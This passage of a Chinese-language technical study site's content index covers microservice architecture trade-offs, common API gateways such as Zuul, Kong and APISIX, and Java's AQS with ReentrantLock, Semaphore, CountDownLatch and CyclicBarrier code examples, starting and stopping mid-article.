轴将服务分区。下面的图演示行程管理服务如何部署在运行于 AWS EC2 上的 Docker 上。\n运行时，行程管理服务由多个服务实例构成。每一个服务实例都是一个 Docker 容器。为了保证高可用，这些容器一般都运行在多个云 VM 上。服务实例前是一层诸如 NGINX 的负载均衡器，他们负责在各个实例间分发请求。负载均衡器也同时处理其它请求，例如缓存、权限控制、API 统计和监控。\n这种微服务架构模式深刻影响了应用和数据库之间的关系， 不像传统多个服务共享一个数据库，微服务架构每个服务都有自己的数据库 。另外，这种思路也影响到了企业级数据模式。同时，这种模式意味着多份数据，但是，如果你想获得微服务带来的好处，每个服务独有一个数据库是必须的，因为这种架构需要这种松耦合。下面的图演示示例应用数据库架构。\n每种服务都有自己的数据库，另外，每种服务可以用更适合自己的数据库类型，也被称作多语言一致性架构。比如，驾驶员管理（发现哪个驾驶员更靠近乘客），必须使用支持地理信息查询的数据库。\n表面上看来，微服务架构模式有点像 SOA，他们都由多个服务构成。但是，可以从另外一个角度看此问题，微服务架构模式是一个不包含 Web 服务 （WS-）和 ESB 服务的 SOA。微服务应用乐于采用简单轻量级协议，比如 REST，而不是 WS-，在微服务内部避免使用 ESB 以及 ESB 类似功能。微服 务架构模式也拒绝使用 canonical schema 等 SOA 概念。\n微服务架构的好处    微服务架构模式有很多好处。首先，通过分解巨大单体式应用为多个服务方法解决了复杂性问题。在功能不变的情况下，应用 被分解为多个可管理的分支或服务。每个服务都有一个用 RPC-或者消息驱动 API 定义清楚的边界。微服务架构模式给采用单体式编码方式很难实现的功能提供 了模块化的解决方案，由此，单个服务很容易开发、理解和维护。\n第二，这种架构使得每个服务都可以有专门开发团队来开发。开发者可以自由选择开发技术，提供 API 服务。当然，许多公司试图避免混乱，只提供某些 技术选择。然后，这种自由意味着开发者不需要被迫使用某项目开始时采用的过时技术，他们可以选择现在的技术。甚至于，因为服务都是相对简单，即使用现在技 术重写以前代码也不是很困难的事情。\n第三，微服务架构模式是每个微服务独立的部署。开发者不再需要协调其它服务部署对本服务的影响。这种改变可以加快部署速度。UI 团队可以采用 AB 测试，快速的部署变化。微服务架构模式使得持续化部署成为可能。\n最后，微服务架构模式使得每个服务独立扩展。你可以根据每个服务的规模来部署满足需求的规模。甚至于，你可以使用更适合于服务资源需求的硬件。比 如，你可以在 EC2 Compute Optimized instances 上部署 CPU 敏感的服务，而在 EC2 memory-optimized instances 上部署内存数据库。\n微服务架构的不足    Fred Brooks 在 30 年前写道，“there are no silver bullets”，像任何其它科技一样，微服务架构也有不足。其中一个跟他的名字类似，『微服务』强调了服务大小，实际上，有一些开发者鼓吹建立稍微大一 些的，10-100 LOC 服务组。尽管小服务更乐于被采用，但是不要忘了这只是终端的选择而不是最终的目的。微服务的目的是有效的拆分应用，实现敏捷开发和部署。\n另外一个主要的不足是，微服务应用是分布式系统，由此会带来固有的复杂性。开发者需要在 RPC 或者消息传递之间选择并完成进程间通讯机制。更甚 于，他们必须写代码来处理消息传递中速度过慢或者不可用等局部失效问题。当然这并不是什么难事，但相对于单体式应用中通过语言层级的方法或者进程调用，微 服务下这种技术显得更复杂一些。\n另外一个关于微服务的挑战来自于分区的数据库架构。商业交易中同时给多个业务分主体更新消息很普遍。这种交易对于单体式应用来说很容易，因为只有 一个数据库。在微服务架构应用中，需要更新不同服务所使用的不同的数据库。使用分布式交易并不一定是好的选择，不仅仅是因为 CAP 理论，还因为今天高扩展 性的 NoSQL 数据库和消息传递中间件并不支持这一需求。最终你不得不使用一个最终一致性的方法，从而对开发者提出了更高的要求和挑战。\n测试一个基于微服务架构的应用也是很复杂的任务。比如，采用流行的 Spring Boot 架构，对一个单体式 web 应用，测试它的 REST API，是很容易的事情。反过来，同样的服务测试需要启动和它有关的所有服务（至少需要这些服务的 stubs）。再重申一次，不能低估了采用微服务架构带 来的复杂性。\n另外一个挑战在于，微服务架构模式应用的改变将会波及多个服务。比如，假设你在完成一个案例，需要修改服务 A、B、C，而 A 依赖 B，B 依赖 C。在 单体式应用中，你只需要改变相关模块，整合变化，部署就好了。对比之下，微服务架构模式就需要考虑相关改变对不同服务的影响。比如，你需要更新服务 C，然 后是 B，最后才是 A，幸运的是，许多改变一般只影响一个服务，而需要协调多服务的改变很少。\n部署一个微服务应用也很复杂，一个分布式应用只需要简单在复杂均衡器后面部署各自的服务器就好了。每个应用实例是需要配置诸如数据库和消息中间件等基础服务。相对比，一个微服务应用一般由大批服务构成。例如，根据 Adrian Cockcroft， Hailo 有 160 个不同服务构成，NetFlix 有大约 600 个服务。每个服务都有多个实例。这就造成许多需要配置、部署、扩展和监控的部分，除此之外，你还需要完成一个服务发现机制（后续文章中发 表），以用来发现与它通讯服务的地址（包括服务器地址和端口）。传统的解决问题办法不能用于解决这么复杂的问题。接续而来，成功部署一个微服务应用需要开 发者有足够的控制部署方法，并高度自动化。\n一种自动化方法是使用 PaaS 服务，例如 Cloud Foundry。 PaaS 给开发者提供一个部署和管理微服务的简单方法，它把所有这些问题都打包内置解决了。同时，配置 PaaS 的系统和网络专家可以采用最佳实践和策略来 简化这些问题。另外一个自动部署微服务应用的方法是开发对于你来说最基础的 PaaS 系统。一个典型的开始点是使用一个集群化方案，比如配合 Docker 使 用 Mesos 或者 Kubernetes。后面的系列我们会看看如何基于软件部署方法例如 NGINX，可以方便的在微服务层面提供缓存、权限控制、API 统 计和监控。\n总结    构建复杂的应用真的是非常困难。单体式的架构更适合轻量级的简单应用。如果你用它来开发复杂应用，那真的会很糟糕。微服务架构模式可以用来构建复杂应用，当然，这种架构模型也有自己的缺点和挑战。\n"},{"id":130,"href":"/system-design/distributed-system/api-gateway/api%E7%BD%91%E5%85%B3%E5%85%A5%E9%97%A8/","title":"api网关入门","parent":"api-gateway","content":"何为网关？为什么要网关？    微服务背景下，一个系统被拆分为多个服务，但是像安全认证，流量控制，日志，监控等功能是每个服务都需要的，没有网关的话，我们就需要在每个服务中单独实现，这使得我们做了很多重复的事情并且没有一个全局的视图来统一管理这些功能。\n综上：一般情况下，网关都会提供请求转发、安全认证（身份/权限认证）、流量控制、负载均衡、容灾、日志、监控这些功能。\n上面介绍了这么多功能，实际上，网关主要做了一件事情：请求过滤 。\n有哪些常见的网关系统？    Netflix Zuul    Zuul 是 Netflix 开发的一款提供动态路由、监控、弹性、安全的网关服务。\nZuul 主要通过过滤器（类似于 AOP）来过滤请求，从而实现网关必备的各种功能。\n我们可以自定义过滤器来处理请求，并且，Zuul 生态本身就有很多现成的过滤器供我们使用。就比如限流可以直接用国外朋友写的 spring-cloud-zuul-ratelimit (这里只是举例说明，一般是配合 hystrix 来做限流)：\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-netflix-zuul\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.marcosbarbero.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-zuul-ratelimit\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.0.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; Zuul 1.x 基于同步 IO，性能较差。Zuul 2.x 基于 Netty 实现了异步 IO，性能得到了大幅改进。\n Github 地址 ： https://github.com/Netflix/zuul 官方 Wiki ： https://github.com/Netflix/zuul/wiki  Spring Cloud Gateway    SpringCloud Gateway 属于 Spring Cloud 生态系统中的网关，其诞生的目标是为了替代老牌网关 **Zuul **。准确点来说，应该是 Zuul 1.x。SpringCloud Gateway 起步要比 Zuul 2.x 更早。\n为了提升网关的性能，SpringCloud Gateway 基于 Spring WebFlux 。Spring WebFlux 使用 Reactor 库来实现响应式编程模型，底层基于 Netty 实现异步 IO。\nSpring Cloud Gateway 的目标，不仅提供统一的路由方式，并且基于 Filter 链的方式提供了网关基本的功能，例如：安全，监控/指标，和限流。\nSpring Cloud Gateway 和 Zuul 2.x 的差别不大，也是通过过滤器来处理请求。不过，目前更加推荐使用 Spring Cloud Gateway 而非 Zuul，Spring Cloud 生态对其支持更加友好。\n Github 地址 ： https://github.com/spring-cloud/spring-cloud-gateway 官网 ： https://spring.io/projects/spring-cloud-gateway  Kong    Kong 是一款基于 OpenResty 的高性能、云原生、可扩展的网关系统。\n OpenResty 是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。\n Kong 提供了插件机制来扩展其功能。比如、在服务上启用 Zipkin 插件\n$ curl -X POST http://kong:8001/services/{service}/plugins \\  --data \u0026#34;name=zipkin\u0026#34; \\  --data \u0026#34;config.http_endpoint=http://your.zipkin.collector:9411/api/v2/spans\u0026#34; \\  --data \u0026#34;config.sample_ratio=0.001\u0026#34;  Github 地址： https://github.com/Kong/kong 官网地址 ： https://konghq.com/kong  APISIX    APISIX 是一款基于 Nginx 和 etcd 的高性能、云原生、可扩展的网关系统。\n etcd是使用 Go 语言开发的一个开源的、高可用的分布式 key-value 存储系统，使用 Raft 协议做分布式共识。\n 与传统 API 网关相比，APISIX 具有动态路由和插件热加载，特别适合微服务系统下的 API 管理。并且，APISIX 与 SkyWalking（分布式链路追踪系统）、Zipkin（分布式链路追踪系统）、Prometheus（监控系统） 等 DevOps 生态工具对接都十分方便。\n作为 NGINX 和 Kong 的替代项目，APISIX 目前已经是 Apache 顶级开源项目，并且是最快毕业的国产开源项目。国内目前已经有很多知名企业（比如金山、有赞、爱奇艺、腾讯、贝壳）使用 APISIX 处理核心的业务流量。\n根据官网介绍：“APISIX 已经生产可用，功能、性能、架构全面优于 Kong”。\n Github 地址 ：https://github.com/apache/apisix 官网地址： https://apisix.apache.org/zh/  相关阅读：\n 有了 NGINX 和 Kong，为什么还需要 Apache APISIX APISIX 技术博客 APISIX 用户案例  Shenyu    Shenyu 是一款基于 WebFlux 的可扩展、高性能、响应式网关，Apache 顶级开源项目。\nShenyu 通过插件扩展功能，插件是 ShenYu 的灵魂，并且插件也是可扩展和热插拔的。不同的插件实现不同的功能。Shenyu 自带了诸如限流、熔断、转发 、重写、重定向、和路由监控等插件。\n Github 地址： https://github.com/apache/incubator-shenyu 官网地址 ： https://shenyu.apache.org/  "},{"id":131,"href":"/java/multi-thread/AQS%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8AAQS%E5%90%8C%E6%AD%A5%E7%BB%84%E4%BB%B6%E6%80%BB%E7%BB%93/","title":"AQS原理以及AQS同步组件总结","parent":"multi-thread","content":"开始之前，先来看几道常见的面试题！建议你带着这些问题来看这篇文章：\n 何为 AQS？AQS 原理了解吗？ CountDownLatch 和 CyclicBarrier 了解吗？两者的区别是什么？ 用过 Semaphore 吗？应用场景了解吗？ \u0026hellip;\u0026hellip;  AQS 简单介绍    AQS 的全称为 AbstractQueuedSynchronizer ，翻译过来的意思就是抽象队列同步器。这个类在 java.util.concurrent.locks 包下面。\nAQS 就是一个抽象类，主要用来构建锁和同步器。\npublic abstract class AbstractQueuedSynchronizer extends AbstractOwnableSynchronizer implements java.io.Serializable { } AQS 为构建锁和同步器提供了一些通用功能的是实现，因此，使用 AQS 能简单且高效地构造出应用广泛的大量的同步器，比如我们提到的 ReentrantLock，Semaphore，其他的诸如 ReentrantReadWriteLock，SynchronousQueue，FutureTask(jdk1.7) 等等皆是基于 AQS 的。\nAQS 原理     在面试中被问到并发知识的时候，大多都会被问到“请你说一下自己对于 AQS 原理的理解”。下面给大家一个示例供大家参考，面试不是背题，大家一定要加入自己的思想，即使加入不了自己的思想也要保证自己能够通俗的讲出来而不是背出来。\n 下面大部分内容其实在 AQS 类注释上已经给出了，不过是英语看着比较吃力一点，感兴趣的话可以看看源码。\nAQS 原理概览    AQS 核心思想是，如果被请求的共享资源空闲，则将当前请求资源的线程设置为有效的工作线程，并且将共享资源设置为锁定状态。如果被请求的共享资源被占用，那么就需要一套线程阻塞等待以及被唤醒时锁分配的机制，这个机制 AQS 是用 CLH 队列锁实现的，即将暂时获取不到锁的线程加入到队列中。\n CLH(Craig,Landin,and Hagersten)队列是一个虚拟的双向队列（虚拟的双向队列即不存在队列实例，仅存在结点之间的关联关系）。AQS 是将每条请求共享资源的线程封装成一个 CLH 锁队列的一个结点（Node）来实现锁的分配。\n 看个 AQS(AbstractQueuedSynchronizer)原理图：\nAQS 使用一个 int 成员变量来表示同步状态，通过内置的 FIFO 队列来完成获取资源线程的排队工作。AQS 使用 CAS 对该同步状态进行原子操作实现对其值的修改。\nprivate volatile int state;//共享变量，使用volatile修饰保证线程可见性 状态信息通过 protected 类型的getState()，setState()，compareAndSetState() 进行操作\n//返回同步状态的当前值 protected final int getState() { return state; } // 设置同步状态的值 protected final void setState(int newState) { state = newState; } //原子地（CAS操作）将同步状态值设置为给定值update如果当前同步状态的值等于expect（期望值） protected final boolean compareAndSetState(int expect, int update) { return unsafe.compareAndSwapInt(this, stateOffset, expect, update); } AQS 对资源的共享方式    AQS 定义两种资源共享方式\n1)Exclusive（独占）\n只有一个线程能执行，如 ReentrantLock。又可分为公平锁和非公平锁，ReentrantLock 同时支持两种锁，下面以 ReentrantLock 对这两种锁的定义做介绍：\n 公平锁 ：按照线程在队列中的排队顺序，先到者先拿到锁 非公平锁 ：当线程要获取锁时，先通过两次 CAS 操作去抢锁，如果没抢到，当前线程再加入到队列中等待唤醒。   说明：下面这部分关于 ReentrantLock 源代码内容节选自：https://www.javadoop.com/post/AbstractQueuedSynchronizer-2 ，这是一篇很不错文章，推荐阅读。\n 下面来看 ReentrantLock 中相关的源代码：\nReentrantLock 默认采用非公平锁，因为考虑获得更好的性能，通过 boolean 来决定是否用公平锁（传入 true 用公平锁）。\n/** Synchronizer providing all implementation mechanics */ private final Sync sync; public ReentrantLock() { // 默认非公平锁  sync = new NonfairSync(); } public ReentrantLock(boolean fair) { sync = fair ? new FairSync() : new NonfairSync(); } ReentrantLock 中公平锁的 lock 方法\nstatic final class FairSync extends Sync { final void lock() { acquire(1); } // AbstractQueuedSynchronizer.acquire(int arg)  public final void acquire(int arg) { if (!tryAcquire(arg) \u0026amp;\u0026amp; acquireQueued(addWaiter(Node.EXCLUSIVE), arg)) selfInterrupt(); } protected final boolean tryAcquire(int acquires) { final Thread current = Thread.currentThread(); int c = getState(); if (c == 0) { // 1. 和非公平锁相比，这里多了一个判断：是否有线程在等待  if (!hasQueuedPredecessors() \u0026amp;\u0026amp; compareAndSetState(0, acquires)) { setExclusiveOwnerThread(current); return true; } } else if (current == getExclusiveOwnerThread()) { int nextc = c + acquires; if (nextc \u0026lt; 0) throw new Error(\u0026#34;Maximum lock count exceeded\u0026#34;); setState(nextc); return true; } return false; } } 非公平锁的 lock 方法：\nstatic final class NonfairSync extends Sync { final void lock() { // 2. 和公平锁相比，这里会直接先进行一次CAS，成功就返回了  if (compareAndSetState(0, 1)) setExclusiveOwnerThread(Thread.currentThread()); else acquire(1); } // AbstractQueuedSynchronizer.acquire(int arg)  public final void acquire(int arg) { if (!tryAcquire(arg) \u0026amp;\u0026amp; acquireQueued(addWaiter(Node.EXCLUSIVE), arg)) selfInterrupt(); } protected final boolean tryAcquire(int acquires) { return nonfairTryAcquire(acquires); } } /** * Performs non-fair tryLock. tryAcquire is implemented in * subclasses, but both need nonfair try for trylock method. */ final boolean nonfairTryAcquire(int acquires) { final Thread current = Thread.currentThread(); int c = getState(); if (c == 0) { // 这里没有对阻塞队列进行判断  if (compareAndSetState(0, acquires)) { setExclusiveOwnerThread(current); return true; } } else if (current == getExclusiveOwnerThread()) { int nextc = c + acquires; if (nextc \u0026lt; 0) // overflow  throw new Error(\u0026#34;Maximum lock count exceeded\u0026#34;); setState(nextc); return true; } return false; } 总结：公平锁和非公平锁只有两处不同：\n 非公平锁在调用 lock 后，首先就会调用 CAS 进行一次抢锁，如果这个时候恰巧锁没有被占用，那么直接就获取到锁返回了。 非公平锁在 CAS 失败后，和公平锁一样都会进入到 tryAcquire 方法，在 tryAcquire 方法中，如果发现锁这个时候被释放了（state == 0），非公平锁会直接 CAS 抢锁，但是公平锁会判断等待队列是否有线程处于等待状态，如果有则不去抢锁，乖乖排到后面。  公平锁和非公平锁就这两点区别，如果这两次 CAS 都不成功，那么后面非公平锁和公平锁是一样的，都要进入到阻塞队列等待唤醒。\n相对来说，非公平锁会有更好的性能，因为它的吞吐量比较大。当然，非公平锁让获取锁的时间变得更加不确定，可能会导致在阻塞队列中的线程长期处于饥饿状态。\n2)Share（共享）\n多个线程可同时执行，如 Semaphore/CountDownLatch。Semaphore、CountDownLatCh、 CyclicBarrier、ReadWriteLock 我们都会在后面讲到。\nReentrantReadWriteLock 可以看成是组合式，因为 ReentrantReadWriteLock 也就是读写锁允许多个线程同时对某一资源进行读。\n不同的自定义同步器争用共享资源的方式也不同。自定义同步器在实现时只需要实现共享资源 state 的获取与释放方式即可，至于具体线程等待队列的维护（如获取资源失败入队/唤醒出队等），AQS 已经在上层已经帮我们实现好了。\nAQS 底层使用了模板方法模式    同步器的设计是基于模板方法模式的，如果需要自定义同步器一般的方式是这样（模板方法模式很经典的一个应用）：\n 使用者继承 AbstractQueuedSynchronizer 并重写指定的方法。（这些重写方法很简单，无非是对于共享资源 state 的获取和释放） 将 AQS 组合在自定义同步组件的实现中，并调用其模板方法，而这些模板方法会调用使用者重写的方法。  这和我们以往通过实现接口的方式有很大区别，这是模板方法模式很经典的一个运用，下面简单的给大家介绍一下模板方法模式，模板方法模式是一个很容易理解的设计模式之一。\n 模板方法模式是基于”继承“的，主要是为了在不改变模板结构的前提下在子类中重新定义模板中的内容以实现复用代码。\n举个很简单的例子假如我们要去一个地方的步骤是：购票 buyTicket()-\u0026gt;安检 securityCheck()-\u0026gt;乘坐某某工具回家 ride() -\u0026gt;到达目的地 arrive()。我们可能乘坐不同的交通工具回家比如飞机或者火车，所以除了ride()方法，其他方法的实现几乎相同。我们可以定义一个包含了这些方法的抽象类，然后用户根据自己的需要继承该抽象类然后修改 ride()方法。\n AQS 使用了模板方法模式，自定义同步器时需要重写下面几个 AQS 提供的模板方法：\nisHeldExclusively()//该线程是否正在独占资源。只有用到condition才需要去实现它。 tryAcquire(int)//独占方式。尝试获取资源，成功则返回true，失败则返回false。 tryRelease(int)//独占方式。尝试释放资源，成功则返回true，失败则返回false。 tryAcquireShared(int)//共享方式。尝试获取资源。负数表示失败；0表示成功，但没有剩余可用资源；正数表示成功，且有剩余资源。 tryReleaseShared(int)//共享方式。尝试释放资源，成功则返回true，失败则返回false。 默认情况下，每个方法都抛出 UnsupportedOperationException。 这些方法的实现必须是内部线程安全的，并且通常应该简短而不是阻塞。AQS 类中的其他方法都是 final ，所以无法被其他类使用，只有这几个方法可以被其他类使用。\n以 ReentrantLock 为例，state 初始化为 0，表示未锁定状态。A 线程 lock() 时，会调用 tryAcquire()独占该锁并将 state+1。此后，其他线程再 tryAcquire() 时就会失败，直到 A 线程 unlock()到 state=0（即释放锁）为止，其它线程才有机会获取该锁。当然，释放锁之前，A 线程自己是可以重复获取此锁的（state 会累加），这就是可重入的概念。但要注意，获取多少次就要释放多么次，这样才能保证 state 是能回到零态的。\n再以 CountDownLatch 以例，任务分为 N 个子线程去执行，state 也初始化为 N（也可以不初始化为 N，不初始化为 N,state 减到 0 也会从 await()返回）。这 N 个子线程是并行执行的，每个子线程执行完后 countDown() 一次，state 会 CAS(Compare and Swap)减 1。等到 state=0，会 unpark() 主调用线程，然后主调用线程就会从 await() 函数返回，继续后余动作。\n所以 CountDownLatch 可以做倒计数器，减到 0 后唤醒的线程可以对线程池进行处理，比如关闭线程池。\n一般来说，自定义同步器要么是独占方法，要么是共享方式，他们也只需实现tryAcquire-tryRelease、tryAcquireShared-tryReleaseShared中的一种即可。但 AQS 也支持自定义同步器同时实现独占和共享两种方式，如ReentrantReadWriteLock。\n推荐两篇 AQS 原理和相关源码分析的文章：\n Java 并发之 AQS 详解 Java 并发包基石-AQS 详解  Semaphore(信号量)    synchronized 和 ReentrantLock 都是一次只允许一个线程访问某个资源，Semaphore(信号量)可以指定多个线程同时访问某个资源。\n示例代码如下：\n/** * * @author Snailclimb * @date 2018年9月30日 * @Description: 需要一次性拿一个许可的情况 */ public class SemaphoreExample1 { // 请求的数量  private static final int threadCount = 550; public static void main(String[] args) throws InterruptedException { // 创建一个具有固定线程数量的线程池对象（如果这里线程池的线程数量给太少的话你会发现执行的很慢）  ExecutorService threadPool = Executors.newFixedThreadPool(300); // 一次只能允许执行的线程数量。  final Semaphore semaphore = new Semaphore(20); for (int i = 0; i \u0026lt; threadCount; i++) { final int threadnum = i; threadPool.execute(() -\u0026gt; {// Lambda 表达式的运用  try { semaphore.acquire();// 获取一个许可，所以可运行线程数量为20/1=20  test(threadnum); semaphore.release();// 释放一个许可  } catch (InterruptedException e) { // TODO Auto-generated catch block  e.printStackTrace(); } }); } threadPool.shutdown(); System.out.println(\u0026#34;finish\u0026#34;); } public static void test(int threadnum) throws InterruptedException { Thread.sleep(1000);// 模拟请求的耗时操作  System.out.println(\u0026#34;threadnum:\u0026#34; + threadnum); Thread.sleep(1000);// 模拟请求的耗时操作  } } 执行 acquire() 方法阻塞，直到有一个许可证可以获得然后拿走一个许可证；每个 release 方法增加一个许可证，这可能会释放一个阻塞的 acquire() 方法。然而，其实并没有实际的许可证这个对象，Semaphore 只是维持了一个可获得许可证的数量。 Semaphore 经常用于限制获取某种资源的线程数量。\n当然一次也可以一次拿取和释放多个许可，不过一般没有必要这样做：\nsemaphore.acquire(5);// 获取5个许可，所以可运行线程数量为20/5=4 test(threadnum); semaphore.release(5);// 释放5个许可 除了 acquire() 方法之外，另一个比较常用的与之对应的方法是 tryAcquire() 方法，该方法如果获取不到许可就立即返回 false。\nSemaphore 有两种模式，公平模式和非公平模式。\n 公平模式： 调用 acquire() 方法的顺序就是获取许可证的顺序，遵循 FIFO； 非公平模式： 抢占式的。  Semaphore 对应的两个构造方法如下：\npublic Semaphore(int permits) { sync = new NonfairSync(permits); } public Semaphore(int permits, boolean fair) { sync = fair ? new FairSync(permits) : new NonfairSync(permits); } 这两个构造方法，都必须提供许可的数量，第二个构造方法可以指定是公平模式还是非公平模式，默认非公平模式。\nissue645 补充内容 ：Semaphore 与 CountDownLatch 一样，也是共享锁的一种实现。它默认构造 AQS 的 state 为 permits。当执行任务的线程数量超出 permits，那么多余的线程将会被放入阻塞队列 Park,并自旋判断 state 是否大于 0。只有当 state 大于 0 的时候，阻塞的线程才能继续执行,此时先前执行任务的线程继续执行 release() 方法，release() 方法使得 state 的变量会加 1，那么自旋的线程便会判断成功。 如此，每次只有最多不超过 permits 数量的线程能自旋成功，便限制了执行任务线程的数量。\nCountDownLatch （倒计时器）    CountDownLatch 允许 count 个线程阻塞在一个地方，直至所有线程的任务都执行完毕。\nCountDownLatch 是共享锁的一种实现,它默认构造 AQS 的 state 值为 count。当线程使用 countDown() 方法时,其实使用了tryReleaseShared方法以 CAS 的操作来减少 state,直至 state 为 0 。当调用 await() 方法的时候，如果 state 不为 0，那就证明任务还没有执行完毕，await() 方法就会一直阻塞，也就是说 await() 方法之后的语句不会被执行。然后，CountDownLatch 会自旋 CAS 判断 state == 0，如果 state == 0 的话，就会释放所有等待的线程，await() 方法之后的语句得到执行。\nCountDownLatch 的两种典型用法    1、某一线程在开始运行前等待 n 个线程执行完毕。\n将 CountDownLatch 的计数器初始化为 n （new CountDownLatch(n)），每当一个任务线程执行完毕，就将计数器减 1 （countdownlatch.countDown()），当计数器的值变为 0 时，在 CountDownLatch 上 await() 的线程就会被唤醒。一个典型应用场景就是启动一个服务时，主线程需要等待多个组件加载完毕，之后再继续执行。\n2、实现多个线程开始执行任务的最大并行性。\n注意是并行性，不是并发，强调的是多个线程在某一时刻同时开始执行。类似于赛跑，将多个线程放到起点，等待发令枪响，然后同时开跑。做法是初始化一个共享的 CountDownLatch 对象，将其计数器初始化为 1 （new CountDownLatch(1)），多个线程在开始执行任务前首先 coundownlatch.await()，当主线程调用 countDown() 时，计数器变为 0，多个线程同时被唤醒。\nCountDownLatch 的使用示例    /** * * @author SnailClimb * @date 2018年10月1日 * @Description: CountDownLatch 使用方法示例 */ public class CountDownLatchExample1 { // 请求的数量  private static final int threadCount = 550; public static void main(String[] args) throws InterruptedException { // 创建一个具有固定线程数量的线程池对象（如果这里线程池的线程数量给太少的话你会发现执行的很慢）  ExecutorService threadPool = Executors.newFixedThreadPool(300); final CountDownLatch countDownLatch = new CountDownLatch(threadCount); for (int i = 0; i \u0026lt; threadCount; i++) { final int threadnum = i; threadPool.execute(() -\u0026gt; {// Lambda 表达式的运用  try { test(threadnum); } catch (InterruptedException e) { // TODO Auto-generated catch block  e.printStackTrace(); } finally { countDownLatch.countDown();// 表示一个请求已经被完成  } }); } countDownLatch.await(); threadPool.shutdown(); System.out.println(\u0026#34;finish\u0026#34;); } public static void test(int threadnum) throws InterruptedException { Thread.sleep(1000);// 模拟请求的耗时操作  System.out.println(\u0026#34;threadnum:\u0026#34; + threadnum); Thread.sleep(1000);// 模拟请求的耗时操作  } } 上面的代码中，我们定义了请求的数量为 550，当这 550 个请求被处理完成之后，才会执行System.out.println(\u0026quot;finish\u0026quot;);。\n与 CountDownLatch 的第一次交互是主线程等待其他线程。主线程必须在启动其他线程后立即调用 CountDownLatch.await() 方法。这样主线程的操作就会在这个方法上阻塞，直到其他线程完成各自的任务。\n其他 N 个线程必须引用闭锁对象，因为他们需要通知 CountDownLatch 对象，他们已经完成了各自的任务。这种通知机制是通过 CountDownLatch.countDown()方法来完成的；每调用一次这个方法，在构造函数中初始化的 count 值就减 1。所以当 N 个线程都调 用了这个方法，count 的值等于 0，然后主线程就能通过 await()方法，恢复执行自己的任务。\n再插一嘴：CountDownLatch 的 await() 方法使用不当很容易产生死锁，比如我们上面代码中的 for 循环改为：\nfor (int i = 0; i \u0026lt; threadCount-1; i++) { ....... } 这样就导致 count 的值没办法等于 0，然后就会导致一直等待。\nCountDownLatch 的不足    CountDownLatch 是一次性的，计数器的值只能在构造方法中初始化一次，之后没有任何机制再次对其设置值，当 CountDownLatch 使用完毕后，它不能再次被使用。\nCountDownLatch 相常见面试题     CountDownLatch 怎么用？应用场景是什么？ CountDownLatch 和 CyclicBarrier 的不同之处？ CountDownLatch 类中主要的方法？  CyclicBarrier(循环栅栏)    CyclicBarrier 和 CountDownLatch 非常类似，它也可以实现线程间的技术等待，但是它的功能比 CountDownLatch 更加复杂和强大。主要应用场景和 CountDownLatch 类似。\n CountDownLatch 的实现是基于 AQS 的，而 CycliBarrier 是基于 ReentrantLock(ReentrantLock 也属于 AQS 同步器)和 Condition 的。\n CyclicBarrier 的字面意思是可循环使用（Cyclic）的屏障（Barrier）。它要做的事情是：让一组线程到达一个屏障（也可以叫同步点）时被阻塞，直到最后一个线程到达屏障时，屏障才会开门，所有被屏障拦截的线程才会继续干活。\nCyclicBarrier 默认的构造方法是 CyclicBarrier(int parties)，其参数表示屏障拦截的线程数量，每个线程调用 await() 方法告诉 CyclicBarrier 我已经到达了屏障，然后当前线程被阻塞。\n再来看一下它的构造函数：\npublic CyclicBarrier(int parties) { this(parties, null); } public CyclicBarrier(int parties, Runnable barrierAction) { if (parties \u0026lt;= 0) throw new IllegalArgumentException(); this.parties = parties; this.count = parties; this.barrierCommand = barrierAction; } 其中，parties 就代表了有拦截的线程的数量，当拦截的线程数量达到这个值的时候就打开栅栏，让所有线程通过。\nCyclicBarrier 的应用场景    CyclicBarrier 可以用于多线程计算数据，最后合并计算结果的应用场景。比如我们用一个 Excel 保存了用户所有银行流水，每个 Sheet 保存一个帐户近一年的每笔银行流水，现在需要统计用户的日均银行流水，先用多线程处理每个 sheet 里的银行流水，都执行完之后，得到每个 sheet 的日均银行流水，最后，再用 barrierAction 用这些线程的计算结果，计算出整个 Excel 的日均银行流水。\nCyclicBarrier 的使用示例    示例 1：\n/** * * @author Snailclimb * @date 2018年10月1日 * @Description: 测试 CyclicBarrier 类中带参数的 await() 方法 */ public class CyclicBarrierExample2 { // 请求的数量  private static final int threadCount = 550; // 需要同步的线程数量  private static final CyclicBarrier cyclicBarrier = new CyclicBarrier(5); public static void main(String[] args) throws InterruptedException { // 创建线程池  ExecutorService threadPool = Executors.newFixedThreadPool(10); for (int i = 0; i \u0026lt; threadCount; i++) { final int threadNum = i; Thread.sleep(1000); threadPool.execute(() -\u0026gt; { try { test(threadNum); } catch (InterruptedException e) { // TODO Auto-generated catch block  e.printStackTrace(); } catch (BrokenBarrierException e) { // TODO Auto-generated catch block  e.printStackTrace(); } }); } threadPool.shutdown(); } public static void test(int threadnum) throws InterruptedException, BrokenBarrierException { System.out.println(\u0026#34;threadnum:\u0026#34; + threadnum + \u0026#34;is ready\u0026#34;); try { /**等待60秒，保证子线程完全执行结束*/ cyclicBarrier.await(60, TimeUnit.SECONDS); } catch (Exception e) { System.out.println(\u0026#34;-----CyclicBarrierException------\u0026#34;); } System.out.println(\u0026#34;threadnum:\u0026#34; + threadnum + \u0026#34;is finish\u0026#34;); } } 运行结果，如下：\nthreadnum:0is ready threadnum:1is ready threadnum:2is ready threadnum:3is ready threadnum:4is ready threadnum:4is finish threadnum:0is finish threadnum:1is finish threadnum:2is finish threadnum:3is finish threadnum:5is ready threadnum:6is ready threadnum:7is ready threadnum:8is ready threadnum:9is ready threadnum:9is finish threadnum:5is finish threadnum:8is finish threadnum:7is finish threadnum:6is finish ...... 可以看到当线程数量也就是请求数量达到我们定义的 5 个的时候， await() 方法之后的方法才被执行。\n另外，CyclicBarrier 还提供一个更高级的构造函数 CyclicBarrier(int parties, Runnable barrierAction)，用于在线程到达屏障时，优先执行 